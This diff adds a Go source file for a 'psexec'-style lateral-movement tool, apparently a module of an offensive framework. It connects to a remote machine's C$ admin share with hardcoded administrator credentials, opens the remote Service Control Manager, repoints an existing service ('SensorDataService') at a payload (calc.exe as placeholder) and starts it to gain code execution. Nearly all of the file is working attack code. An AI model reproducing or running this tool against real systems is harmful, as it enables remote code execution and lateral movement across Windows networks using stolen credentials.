@@ -1,0 +1,119 @@
+/*{
+Name: psexec
+Author: TerminalJockey
+Description: modifies service executable on target machine, and starts service gaining code execution.Requires valid admin creds.
+Options:
+Lhost
+Lport
+Rhost
+Rport
+Username
+Password
+Domain
+<TBF>
+}*
+
+
+package main
+
+import (
+	"fmt"
+	"log"
+	"syscall"
+	"time"
+	"unsafe"
+)
+
+type (
+	DWORD uint32
+)
+
+type NETRESOURCE struct {
+	Scope       DWORD
+	Type        DWORD
+	DisplayType DWORD
+	Usage       DWORD
+	LocalName   *uint16
+	RemoteName  *byte
+	Comment     *uint16
+	Provider    *uint16
+}
+
+func main() {
+	//krn32 := syscall.NewLazyDLL("kernel32.dll")
+	mpr := syscall.NewLazyDLL("mpr.dll")
+
+	//get connection to remote device
+	testval, _ := syscall.BytePtrFromString("\\\\DESKTOP-KNFBL0R\\C$")
+	netr := NETRESOURCE{
+		Scope:       1,
+		Type:        1,
+		DisplayType: 3,
+		Usage:       19,
+		LocalName:   syscall.StringToUTF16Ptr(""),
+		RemoteName:  testval,
+		Comment:     syscall.StringToUTF16Ptr(""),
+		Provider:    syscall.StringToUTF16Ptr(""),
+	}
+
+	WNetAddConnection2A := mpr.NewProc("WNetAddConnection2A")
+	Uname := syscall.StringBytePtr(`.\Administrator`)
+	Passwd := syscall.StringBytePtr("tryhard123")
+	ret, _, err := WNetAddConnection2A.Call(uintptr(unsafe.Pointer(&netr)), uintptr(unsafe.Pointer(Passwd)), uintptr(unsafe.Pointer(Uname)), 1)
+	if err != nil {
+		log.Println("initconn:", err)
+	}
+	fmt.Println(ret)
+	time.Sleep(50 * time.Millisecond)
+
+	WNetCancelConnectionA := mpr.NewProc("WNetCancelConnectionA")
+
+	cancelret, _, err := WNetCancelConnectionA.Call(uintptr(unsafe.Pointer(testval)), 1)
+	if err != nil {
+		log.Println("cancelerr:", err)
+	}
+	fmt.Println("cancel op output:", cancelret)
+	time.Sleep(50 * time.Millisecond)
+
+	advapi32 := syscall.NewLazyDLL("advapi32.dll")
+
+	OpenScManagerW := advapi32.NewProc("OpenSCManagerW")
+	hostname := syscall.StringToUTF16Ptr(`DESKTOP-KNFBL0R`)
+	svchandle, _, err := OpenScManagerW.Call(uintptr(unsafe.Pointer(hostname)), 0, 0xF003F)
+	if err != nil {
+		log.Println("OpenServiceManager:", err)
+	}
+	time.Sleep(50 * time.Millisecond)
+
+	OpenServiceW := advapi32.NewProc("OpenServiceW")
+
+	svcname := syscall.StringToUTF16Ptr("SensorDataService")
+	opencheck, _, err := OpenServiceW.Call(svchandle, uintptr(unsafe.Pointer(svcname)), 0xF003F)
+	if err != nil {
+		log.Println("openerr:", err)
+	}
+	fmt.Println("opencheck:", opencheck)
+	time.Sleep(50 * time.Millisecond)
+
+	changeServiceConfig := advapi32.NewProc("ChangeServiceConfigA")
+
+	
+	newsvc := syscall.StringBytePtr("calc.exe")
+	lpServiceStartName := syscall.StringBytePtr(`.\Administrator`)
+	lpPasswd := syscall.StringBytePtr("tryhard123")
+
+	changecheck, _, err := changeServiceConfig.Call(opencheck, 0xFFFFFFFF, 3, 0, uintptr(unsafe.Pointer(newsvc)), uintptr(0), uintptr(0), uintptr(0), uintptr(unsafe.Pointer(lpServiceStartName)), uintptr(unsafe.Pointer(lpPasswd)), uintptr(0))
+	if err != nil {
+		log.Println("changeerr:", err)
+	}
+	fmt.Println("Change service output:", changecheck)
+	time.Sleep(50 * time.Millisecond)
+
+	StartServiceA := advapi32.NewProc("StartServiceA")
+	_, _, err = StartServiceA.Call(opencheck, 0, uintptr(0))
+	if err != nil {
+		log.Println(err)
+	}
+	time.Sleep(50 * time.Millisecond)
+
+}
